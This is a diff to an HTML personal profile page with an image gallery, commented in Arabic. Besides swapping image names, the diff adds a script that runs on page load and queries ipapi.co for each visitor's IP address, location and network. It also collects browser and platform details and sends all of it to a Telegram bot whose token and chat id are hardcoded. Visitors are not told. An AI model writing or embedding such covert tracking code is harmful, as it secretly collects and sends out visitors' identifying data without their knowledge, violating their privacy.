@@ -24,7 +24,7 @@
       border-radius: 50%;
       border: 5px solid white;
       background-color: #4b0082;
-      background-image: url('profile.jpg'); /* 👑 اسم صورة البروفايل */
+      background-image: url("profile.png"); /* 👑 اسم صورة البروفايل */
       background-size: cover;
       background-position: center;
       position: absolute;
@@ -81,22 +81,48 @@
 
   <!-- 👑 معرض صور 5x5 -->
   <div class="gallery">
-    <img src="img1.jpg" alt="وصف الصورة 1" title="وصف الصورة 1"> <!-- 👑 غيّر اسم الصورة والوصف -->
-    <img src="img2.jpg" alt="وصف الصورة 2" title="وصف الصورة 2">
+    <img src="بدون اسم150_20250616203704.png" alt="وصف الصورة 1" title="وصف الصورة 1">
+    <img src="بدون اسم130_20250502141304.png" alt="وصف الصورة 2" title="وصف الصورة 2">
     <img src="img3.jpg" alt="وصف الصورة 3" title="وصف الصورة 3">
     <img src="img4.jpg" alt="وصف الصورة 4" title="وصف الصورة 4">
     <img src="img5.jpg" alt="وصف الصورة 5" title="وصف الصورة 5">
-    <!-- 👑 أضف المزيد حتى 25 -->
+    <!-- 👑 يمكنك إضافة حتى 25 صورة -->
   </div>
 
   <!-- 👑 زر فيديو -->
   <button class="video-button" onclick="location.href='videos.html'">🎥 مشاهدة الفيديوهات</button>
 
-  <!-- 👑 كود إرسال البيانات إلى PHP -->
+  <!-- 👑 إرسال معلومات الزائر للبوت -->
   <script>
-    fetch("track.php", {
-      method: "POST"
-    });
+    const botToken = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+    const chatId = "7664410054";
+
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const message = `
+📥 دخول جديد لصفحة البروفايل
+
+🌍 IP: ${data.ip}
+🏳️ الدولة: ${data.country_name}
+🏙️ المدينة: ${data.city}
+🏢 الشبكة: ${data.org}
+🧠 النظام: ${navigator.platform}
+🧭 المتصفح: ${navigator.userAgent}
+🌐 اللغة: ${navigator.language}
+        `;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+      })
+      .catch(err => console.error("❌ خطأ أثناء جلب IP:", err));
   </script>
 </body>
 </html>
+
